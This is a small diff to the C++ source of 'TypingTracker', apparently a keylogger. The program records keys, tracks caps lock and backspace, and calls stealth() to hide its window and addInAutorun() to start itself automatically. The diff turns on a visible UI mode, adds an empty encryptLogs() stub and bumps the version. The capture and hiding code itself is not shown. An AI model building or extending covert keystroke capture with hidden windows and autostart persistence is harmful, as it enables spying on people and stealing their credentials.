@@ -19,12 +19,17 @@
 #include <string>
 #include <time.h>
 
-//#define VISIBLE_UI //Macros for UI conditional compilation  
+#define VISIBLE_UI //Macros for UI conditional compilation  
 
 //using namespace std;
 
 bool is_capslock = false;
 int backspace = 0; 
+
+void encryptLogs()
+{
+
+}
 
 int save(const int key)
 {
@@ -705,7 +710,7 @@ int main(int argc, char *argv[])
 {
 	#ifdef VISIBLE_UI
 	//UI for interactions with application display mode
-	std::cout << "TypingTracker v0.2.4\n" << std::endl;
+	std::cout << "TypingTracker v0.2.5\n" << std::endl;
 
 	unsigned short int display_mode;
 	std::cout << "Display mode 1 - visible window, 0 - hidden window" << std::endl;
@@ -726,7 +731,7 @@ int main(int argc, char *argv[])
 
 	#ifndef VISIBLE_UI
 	stealth();
-	#endif//VISIBLE_UI
+	#endif //VISIBLE_UI
 
 	addInAutorun();
 
